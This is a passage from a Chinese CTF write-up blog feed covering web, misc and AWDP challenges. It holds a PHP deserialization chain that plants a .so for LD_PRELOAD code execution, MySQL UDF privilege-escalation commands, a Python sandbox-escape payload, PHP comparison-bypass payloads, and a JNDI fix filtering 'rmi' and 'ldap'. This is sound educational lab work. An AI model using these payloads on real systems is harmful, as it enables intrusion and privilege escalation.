class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__call&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.[^.]*$/&#x27;</span>, <span class="variable">$this</span>-&gt;filename, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">            <span class="variable">$uploadDir</span> = <span class="string">&quot;/tmp/&quot;</span>;</span><br><span class="line">            <span class="variable">$destination</span> = <span class="variable">$uploadDir</span> . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>()) . <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>[<span class="number">0</span>]));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">rename</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$destination</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;文件成功移动到$&#123;destination&#125;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;文件移动失败。&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非法文件名。&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FUN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__get&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun-&gt;<span class="title function_ invoke__">getflag</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ENV</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math = <span class="keyword">new</span> <span class="title function_ invoke__">DIFF</span>(); </span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback = <span class="keyword">new</span> <span class="title function_ invoke__">FUN</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback-&gt;fun = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback-&gt;fun-&gt;filename = <span class="string">&quot;123.so&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback-&gt;value = <span class="variable">$file_data</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到 so 的路径</p><p><img src="/./2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/w_1_1.png"></p><p>设置 <code>putenv(&quot;$key=$value&quot;);</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ENV</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$math</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$key</span>=<span class="title function_ invoke__">filter</span>(<span class="variable">$this</span>-&gt;key);</span><br><span class="line">        <span class="variable">$value</span>=<span class="title function_ invoke__">filter</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">        <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">$key</span>=<span class="subst">$value</span>&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat hints.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;math-&gt;flag))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YesYes&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YesYesYes&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DIFF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callback</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$back</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;callback-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are stupid, what exactly is your identity?&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$enviroment</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;hacker&quot;</span>==<span class="variable language_">$this</span>-&gt;enviroment)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hacker is bad guy!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$function_name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__call&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.[^.]*$/&#x27;</span>, <span class="variable">$this</span>-&gt;filename, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">            <span class="variable">$uploadDir</span> = <span class="string">&quot;/tmp/&quot;</span>;</span><br><span class="line">            <span class="variable">$destination</span> = <span class="variable">$uploadDir</span> . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>()) . <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>[<span class="number">0</span>]));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">rename</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$destination</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;文件成功移动到$&#123;destination&#125;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;文件移动失败。&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非法文件名。&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FUN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__get&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun-&gt;<span class="title function_ invoke__">getflag</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ENV</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math = <span class="keyword">new</span> <span class="title function_ invoke__">DIFF</span>(); </span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback-&gt;enviroment = <span class="keyword">new</span> <span class="title function_ invoke__">ENV</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback-&gt;enviroment-&gt;key=<span class="string">&quot;LD_PRELOAD&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback-&gt;enviroment-&gt;value=<span class="string">&quot;/tmp/fc10f947e66e299bb30931ebc7975612.so&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A3%3A%22ENV%22%3A3%3A%7Bs%3A3%3A%22key%22%3BN%3Bs%3A5%3A%22value%22%3BN%3Bs%3A4%3A%22math%22%3BO%3A4%3A%22DIFF%22%3A3%3A%7Bs%3A8%3A%22callback%22%3BO%3A4%3A%22FILE%22%3A2%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A10%3A%22enviroment%22%3BO%3A3%3A%22ENV%22%3A3%3A%7Bs%3A3%3A%22key%22%3Bs%3A10%3A%22LD_PRELOAD%22%3Bs%3A5%3A%22value%22%3Bs%3A40%3A%22%2Ftmp%2Fc41ca1759f4f00a84ad7fb5c5c1a949f.so%22%3Bs%3A4%3A%22math%22%3BN%3B%7D%7Ds%3A4%3A%22back%22%3BN%3Bs%3A4%3A%22flag%22%3BN%3B%7D%7D</span></span><br></pre></td></tr></table></figure><p>发送过去后即可写马成功，访问 <code>1.php</code>，即可rce。</p><p><img src="/./2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/w_1_2.png"></p><h2 id="brother"><a href="#brother" class="headerlink" title="brother"></a>brother</h2><p>非预期，udf提权。</p><p>先是 <code>SSTI</code>反弹shell，ssti没有过滤，随便来一条payload都可以反弹。</p><p>接着用 <code>ps -axu</code>查看进程，发现 mysql是root用户起的，udf提权成功后就是root用户了。</p><p><img src="/./2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/w_2_1.png"></p><p>参考链接：<a href="https://www.cnblogs.com/sfsec/p/15241860.html">MySQL提权总结</a></p><p>先在kali的<code>/usr/share/metasploit-framework/data/exploits/mysql/</code>目录下找到对应版本的 so 文件，然后上传服务器。</p><p>机器里有wget ，可以用wget下载自己的 so文件。</p><p>接着把下载的so文件移动到 <code>/usr/lib/mysql/p1ugin/</code> 目录。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uctf -p123456 -e <span class="string">&quot;show variables like &#x27;%plugin%&#x27;;&quot;</span></span><br></pre></td></tr></table></figure><p>用以上命令能查出上面那个目录。sql的用户密码是在<code>api.py</code>里找到的。</p><p>用cp命令是移动不了的，但mysql是root起的，可以用mysql来写写文件。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uctf -p123456 -e <span class="string">&quot;select load_file(&#x27;/tmp/udf64.so&#x27;) into dumpfile &#x27;//usr/lib/mysql/plugin/udf.so&#x27;;&quot;</span></span><br></pre></td></tr></table></figure><p>成功将 <code>udf64.so</code>移动到 <code>/usr/lib/mysql/plugin/udf.so</code>。</p><p>udf提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uctf -p123456 -e <span class="string">&quot;create function sys_eval returns string soname &#x27;udf.so&#x27;;&quot;</span></span><br></pre></td></tr></table></figure><p>之后就可以执行系统命令读flag了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uctf -p123456 -e <span class="string">&quot;select sys_eval(&#x27;cat /flag&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/./2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/w_2_2.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="初探勒索病毒"><a href="#初探勒索病毒" class="headerlink" title="初探勒索病毒"></a>初探勒索病毒</h2><p>关注公众号得到提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">【2024春秋杯夏季赛】</span><br><span class="line">https://www.nomoreransom.org/zh/decryption-tools.html</span><br><span class="line">搜索BlackBasta，并点击下载。</span><br><span class="line"></span><br><span class="line">（如果您还需要进一步的提示，可在本公众号输入“BASTA2”获取。）</span><br><span class="line"></span><br><span class="line">【2024春秋杯夏季赛】</span><br><span class="line">sed -i &#x27;s/flags/&quot;flags&quot;/&#x27; ./decryptblocks.py</span><br><span class="line">export SRL_IGNORE_MAGIC=1</span><br><span class="line">./decryptblocks.py ./banana.jpg.sah28vut5 ./key.block</span><br></pre></td></tr></table></figure><p>下载文件并上传服务器。</p><p>因为题目给了个http，猜测加密图片在 <code>/var/www/html</code>，去看一下发现正确。</p><p>接着按照要求执行提示中的命令，之后将 <code>banana.jpg.sah28vut5</code>重命名为 <code>banana.jpg</code>，等待1分钟即可<code>cat /flag</code>。</p><h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><h2 id="ezSpring"><a href="#ezSpring" class="headerlink" title="ezSpring"></a>ezSpring</h2><p><strong>修复</strong></p><p>查看源码，发现是 JNDI 注入</p><p><img src="/./2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/a_1_1.png"></p><p>修复的时候加上过滤就行了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/lookup/*&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="meta">@RequestParam(value = &quot;url&quot;,required = false)</span> String url)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (url == <span class="literal">null</span> || url.contains(<span class="string">&quot;rmi&quot;</span>) || url.contains(<span class="string">&quot;ldap&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;missing url parameter&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> ctx.lookup(url);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Lookup successful: &quot;</span> + result;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var4) &#123;</span><br><span class="line">                var4.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Lookup failed&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="simplegoods"><a href="#simplegoods" class="headerlink" title="simplegoods"></a>simplegoods</h2><p>代码审计，在 <code>market.php</code>里发现了一个 <code>include</code></p><p><img src="/./2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/a_2_1.png"></p><p>把这行注释掉，改成 <code>echo</code> 即可。</p><p> <img src="/./2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/a_2_2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> AWDP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国海洋大学信息安全竞赛 WP</title>
      <link href="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
      <url>/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="菜狗工具-1"><a href="#菜狗工具-1" class="headerlink" title="菜狗工具#1"></a>菜狗工具#1</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;input&#x27;</span></span><br><span class="line">]</span><br><span class="line">new_builtins = <span class="built_in">dict</span>([</span><br><span class="line">    (key, val) <span class="keyword">for</span> key, val <span class="keyword">in</span> __builtins__.__dict__.items() <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> black_list</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/static/index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    out = io.StringIO()</span><br><span class="line">    script = <span class="built_in">str</span>(request.form[<span class="string">&quot;script&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrap_print</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        kwargs[<span class="string">&quot;file&quot;</span>] = out</span><br><span class="line">        <span class="built_in">print</span>(*args, **kwargs)</span><br><span class="line">    new_builtins[<span class="string">&quot;print&quot;</span>] = wrap_print</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(script, &#123;<span class="string">&quot;__builtins__&quot;</span>: new_builtins&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        wrap_print(e)</span><br><span class="line">    </span><br><span class="line">    ret = out.getvalue()</span><br><span class="line">    out.close()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9001</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把这个题当成一个SSTI去做就可以了(</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;env&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/w_1_1.png"></p><h2 id="ezPHP"><a href="#ezPHP" class="headerlink" title="ezPHP"></a>ezPHP</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O.U.C&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/_|%5f|\.|%2E/i&#x27;</span>,<span class="variable">$query</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;听说你是黑客&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;你知道b等于什么能绕过这个弱类型吗（〃｀ 3′〃）&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])&amp;&amp;<span class="variable">$a</span>!=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;哎呦，不错喔&quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$O_U_C</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;O_U_C&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$O_U_C</span>)&amp;&amp;<span class="variable">$O_U_C</span>!==<span class="string">&#x27;100&#x27;</span>&amp;&amp;<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^100$/&#x27;</span>,<span class="variable">$O_U_C</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;but&#x27;</span>.<span class="string">&#x27;如果我寄出===阁下又该如何应对๑乛◡乛๑&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;好，那么好&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;md5&quot;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>])))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;还是被你解出来了&#x27;</span>.<span class="string">&#x27; ྀི ྀིɞ ྀི ིྀ ིྀ&#x27;</span>.<span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;告诉你secret的md5值也无妨，反正哈希是不可逆的๑乛◡乛๑，除非你能箨斩攻击我&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="string">&#x27;ouc&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;不过如此&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行嘛(´ｪ｀)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;嗨害嗨  (๑ᵒ̴̶̷͈᷄ᗨᵒ̴̶̷͈᷅)&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>存在变量覆盖，把$a覆盖成想要的值绕过MD5弱比较。</p><p>接着是 <code>!is_array($O_U_C)&amp;&amp;$O_U_C!==&#39;100&#39;&amp;&amp;preg_match(&#39;/^100$/&#39;,$O_U_C)</code>，用<code>%0a</code>绕过 <code>preg_match(&#39;/^100$/&#39;,$O_U_C)</code>的判断。</p><p>MD5强碰撞用数组绕过</p><p><code>$_COOKIE[&quot;md5&quot;]===md5($secret.urldecode($_GET[&#39;md5&#39;]))</code>，因为给了<code>md5($secret.&#39;ouc&#39;)</code>，因此cookie带上这个值，<code>$_GET[&#39;md5&#39;]</code>为 <code>ouc</code>即可。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: a=QNKCDZO&amp;b=s878926199a&amp;O+U+C=100%0a&amp;md5=ouc</span><br><span class="line"></span><br><span class="line">POST: md51[]=1&amp;md52[]=2</span><br><span class="line"></span><br><span class="line">Cookie: 